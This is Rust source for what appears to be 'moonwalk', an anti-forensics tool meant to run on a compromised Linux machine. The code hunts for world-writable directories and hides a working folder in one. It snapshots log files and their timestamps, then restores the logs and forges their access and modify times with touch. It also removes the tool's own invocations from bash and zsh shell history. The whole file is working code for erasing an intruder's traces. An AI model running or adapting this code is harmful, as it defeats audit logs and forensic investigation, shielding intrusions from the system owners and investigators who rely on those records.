use colored::*;

/// Logging message types
pub enum Type {
    _Warning,
    Skipped,
    Error,
    Info,
    Success,
}

/// Outputs logging messages
pub fn push_message(log_type: Type, message: &str) {
    let prefix = match log_type {
        Type::_Warning => format!("{}{}{}", "[".bold(), "WARN".bold().yellow(), "]".bold()),
        Type::Skipped => format!("{}{}{}", "[".bold(), "SKIPPED".bold().yellow(), "]".bold()),
        Type::Error => format!("{}{}{}", "[".bold(), "ERROR".bold().red(), "]".bold()),
        Type::Info => format!("{}{}{}", "[".bold(), "INFO".bold().cyan(), "]".bold()),
        Type::Success => format!("{}{}{}", "[".bold(), "SUCCESS".bold().green(), "]".bold())
    };

    eprintln!("{}", format!("{} {}", prefix, message))
}

use std::process::Command;

use super::fs::FileSystem;

/// Returns world-writable directories in the target machine
pub fn return_wr_dir() -> String {
    let child_process = Command::new("find")
        .args(["/", "-maxdepth", "3", "-type", "d", "-perm", "-777"])
        .output()
        .expect("failed to execute child process");

    let output = String::from_utf8_lossy(&child_process.stdout);
    let dir_list: Vec<&str> = output.lines().collect();

    for dir_path in dir_list {
        if dir_path.contains('/') && FileSystem::file_exists(dir_path) {
            match FileSystem::create_dir(
                &format!("{}/{}", dir_path, ".MOONWALK")
            ) {
                Ok(()) => return String::from(dir_path),
                Err(_) => continue
            }
        }
    }

    String::from("/tmp") // fallback default
}

use std::borrow::Cow;
use super::fs::FileStat;

/// Parses the date time format from `stat` to `[[CC]YY]MMDDhhmm[.ss]` format
#[inline]
pub fn nix_timestamp_parser(
    timestamp_str: &str
) -> String {
    let mut fmt_time = String::with_capacity(15);
    let mut start_parse: bool = false;
    let mut seek_colon: bool = false;

    for c in timestamp_str.chars() {
        if c == ' ' { start_parse = true }
        if start_parse {
            match c {
                '-' | ' ' => (),
                ':' => {
                    if seek_colon {
                        fmt_time.push('.')
                    }
                    seek_colon = true;
                },
                '.' => break,
                _ => fmt_time.push(c)
            }
        }
    }

    fmt_time
} // hehe

/// Offloads the required fields from `stat` to parse timestamps
#[inline]
pub fn nix_stat_parser(
    stream: Cow<'_, str>
) -> FileStat {
    let mut atime = String::with_capacity(15);
    let mut mtime = String::with_capacity(15);
    let ctime = String::new();

    for line in stream.lines() {
        if line.contains("Access") && !line.contains("Uid") {
            atime = nix_timestamp_parser(line);
        } else if line.contains("Modify") {
            mtime = nix_timestamp_parser(line)
        }
    }

    FileStat {
        atime,
        mtime,
        ctime
    }
}

use std::io::Result;

use super::{
    values,
    fs::FileSystem,
    logger::TMP_LOG_DIR
};

/// Clears every invokation of `moonwalk` from shell history
pub fn clear_me_from_history() -> Result<()> {
    const HISTORY_FILES: [&str; 2] = ["~/.bash_history", "~/.zsh_history"];

    // get current authenticated user
    let user = &values::CURR_USER;

    for file in HISTORY_FILES {
        let mut file_path: String = String::from(file);

        // parse and resolve `~/` home path
        if file_path.starts_with('~') {
            let current_user = format!(
                "/home/{:?}/",
                user.name()
            ).replace('"', "");

            file_path = file_path.replace("~/", &current_user);
        }

        let mut write_buffer = String::new();

        if FileSystem::file_exists(&file_path) {
            let history_file_bytes = FileSystem::read(&file_path)?;

            let file_contents = String::from_utf8_lossy(
                &history_file_bytes
            );

            for line in file_contents.lines() {
                let condition = line.contains("moonwalk") || line.contains("MOONWALK");

                if !condition {
                    write_buffer.push_str(line);
                    write_buffer.push('\n')
                }
            }

            FileSystem::write(
                &file_path,
                write_buffer.as_bytes()
            )?;
        }
    }

    // finally remove the logging directory
    FileSystem::remove_dir(&TMP_LOG_DIR)?;

    Ok(())
}

use std::fs;
use std::io::BufReader;
use std::io::prelude::*;
use std::path::Path;
use std::io::Result;
use std::process::Command;

use super::parsers::nix_stat_parser;

use serde::{Deserialize, Serialize};

pub struct FileSystem;

#[derive(Serialize, Deserialize)]
pub struct FileStat {
    pub atime: String,
    pub mtime: String,
    pub ctime: String
}

impl FileSystem {
    /// Returns stat info of files to parse access/modify timestamps
    pub fn file_nix_stat(file_path: &str) -> FileStat {
        // return file stats from child process
        let child_process = Command::new("stat")
            .arg(file_path)
            .output()
            .expect("failed to execute child process");

        // parse unix timestamp from fs stats
        nix_stat_parser(
            String::from_utf8_lossy(&child_process.stdout)
        )
    }

    /// Apply timestamps to files using the touch utility
    #[inline]
    pub fn change_file_timestamp(file_path: &str, stat: FileStat) {
        Command::new("/usr/bin/touch")
            .args([
                "-a", "-t", &stat.atime,
                "-m", "-t", &stat.mtime,
                file_path
            ])
            .output()
            .expect("failed to execute child process");
    }

    /// Returns if a file path exists or not
    #[inline]
    pub fn file_exists(file_path: &str) -> bool {
        Path::new(file_path).exists()
    }

    /// Read a file into bytes
    pub fn read(file_path: &str) -> Result<Vec<u8>> {
        let file = fs::File::open(file_path)?;
        let mut buf_reader = BufReader::new(file);
        let mut contents: Vec<u8> = Vec::new();
        buf_reader.read_to_end(&mut contents)?;
        Ok(contents)
    }

    /// Write bytes to a file
    pub fn write(file_path: &str, contents: &[u8]) -> Result<()> {
        let mut file = fs::File::create(file_path)?;
        file.write_all(contents)?;
        Ok(())        
    }

    /// Create a recursive directory
    pub fn create_dir(file_path: &str) -> Result<()> {
        if !Path::new(file_path).exists() {
            fs::create_dir_all(file_path)?
        }
        Ok(())
    }

    /// Remove a directory at absolute path
    pub fn remove_dir(file_path: &str) -> Result<()> {
        if Path::new(file_path).exists() {
            fs::remove_dir_all(file_path)?
        }
        Ok(())
    }
}

use std::io::Result;

use serde::{Deserialize, Serialize};
use serde_json::{Map, Value};

use once_cell::sync::Lazy;

use super::{
    values,
    fs::{FileSystem, FileStat},
    recon::return_wr_dir,
    messages::{Type, push_message}
};

// set the logging directory inside a world writable directory in the target machine
pub static TMP_LOG_DIR: Lazy<String> = Lazy::new(|| {
    format!("{}/.MOONWALK", return_wr_dir())
});

pub(crate) struct Logger;

#[derive(Serialize, Deserialize)]
struct StatMap {
    log_files: Map<String, Value>
}

impl Logger {
    /// Prepares logging directory in a world-writable directory
    pub fn init() -> Result<()> {
        push_message(
            Type::Info,
            &format!("Found `{}` as world writable.", *TMP_LOG_DIR)
        );
        push_message(
            Type::Info,
            &format!("Set `{}` as the logging directory", *TMP_LOG_DIR)
        );
        FileSystem::create_dir(&TMP_LOG_DIR)?;
        Self::save_state()?;
        Ok(())
    }

    /// Saves the current state of log files including it's timestamps
    pub fn save_state() -> Result<()> {
        // get current authenticated user
        let user = &values::CURR_USER;

        // initiate a HashMap for saving the current timestamps of log files
        let mut file_stat_map = StatMap {
            log_files: Map::with_capacity(values::LOG_FILES.len())
        };

        // save states of all log files
        for log_file in values::LOG_FILES {
            let mut log_file: String = String::from(log_file);

            // parse and resolve `~/` home path
            if log_file.starts_with('~') {
                let current_user = format!(
                    "/home/{:?}/",
                    user.name()
                ).replace('"', "");

                log_file = log_file.replace("~/", &current_user);
            }

            if FileSystem::file_exists(&log_file) {
                // handle exact fs structure creation under logger directory
                let mut path: Vec<&str> = log_file.split('/').collect();
                path.pop();
                let dir_structure = path.join("/");

                // create the same directory structure moonwalk's tmp dir
                FileSystem::create_dir(
                    &format!("{}{}", *TMP_LOG_DIR, dir_structure)
                )?;

                // save target directory path
                let save_state_file = format!("{}{}", *TMP_LOG_DIR, log_file);

                // serialize the log file's stat timestamps
                let file_stat = FileSystem::file_nix_stat(&log_file);
                let stat_time = format!("{}|{}", file_stat.atime, file_stat.mtime);
                file_stat_map.log_files.insert(log_file.clone(), stat_time.into());

                // save the log file's current state of bytes
                match FileSystem::read(&log_file) {
                    Ok(contents) => {
                        FileSystem::write(
                            &save_state_file,
                            &contents
                        )?
                    },
                    Err(error) => {
                        // log the file if it's not authorized to access
                        if error.to_string().contains("Permission denied") {
                            push_message(
                                Type::Skipped,
                                &format!("Logging `{}` requires sudo privileges.", log_file)
                            )
                        } else {
                            push_message(
                                Type::Error,
                                &format!("Couldn't read `{}` because: {}.", log_file, error)
                            )
                        }
                    }
                };
            }
        }

        // save a JSON map of all log file's unix timestamps
        let json_config = serde_json::to_string_pretty(&file_stat_map)?;
        let save_path = format!("{}/{}", *TMP_LOG_DIR, "log_file_timestamps.json");
        FileSystem::write(&save_path, json_config.as_bytes())?;

        push_message(Type::Success, "Saved the current log states.");

        Ok(())
    }

    /// Restore the saved state of log files to clear the modification traces
    pub fn restore_state() -> Result<()> {
        // get current authenticated user
        let user = &values::CURR_USER;

        // retrieve timestamps of files
        let read_log_json = FileSystem::read(
            &format!("{}/{}", *TMP_LOG_DIR, "log_file_timestamps.json")
        )?;

        let file_stat_map: StatMap = serde_json::from_slice(&read_log_json)?;

        for log_file in values::LOG_FILES {
            let mut log_file: String = String::from(log_file);

            // parse and resolve `~/` home path
            if log_file.starts_with('~') {
                let current_user = format!(
                    "/home/{:?}/",
                    user.name()
                ).replace('"', "");

                log_file = log_file.replace("~/", &current_user);
            }

            let fmt_filename = log_file.clone();

            let read_path = format!("{}{}", *TMP_LOG_DIR, fmt_filename)
                .replace('~', "");

            if FileSystem::file_exists(&read_path) {
                // restore the initial states of all logged files
                match FileSystem::read(&read_path) {
                    Ok(contents) => {
                        match FileSystem::write(
                            &log_file,
                            &contents
                        ) {
                            Ok(()) => (),
                            Err(error) => {
                                if error.to_string().contains("Permission denied") {
                                    push_message(
                                        Type::Skipped,
                                        &format!("Writing `{}` requires sudo privileges.", log_file)
                                    )
                                } else {
                                    push_message(
                                        Type::Error,
                                        &format!("Couldn't write `{}` because: {}.", log_file, error)
                                    )
                                }
                            }
                        }
                    },
                    Err(error) => {
                        push_message(
                            Type::Error,
                            &format!("Couldn't read `{}` because: {}.", log_file, error)
                        )
                    }
                };

                // resolve timestamps of files from stat map
                let timestamps: Vec<&str> = file_stat_map.log_files.get(&log_file).unwrap()
                    .as_str()
                    .unwrap()
                    .split('|')
                    .collect();

                let atime = timestamps[0];
                let mtime = timestamps[1];

                let file_stats = FileStat {
                    atime: atime.into(),
                    mtime: mtime.into(),
                    ctime: String::new()
                };

                FileSystem::change_file_timestamp(
                    &log_file,
                    file_stats
                )
            }
        }

        push_message(Type::Success, "Restored initial machine states.");

        Ok(())
    }
}
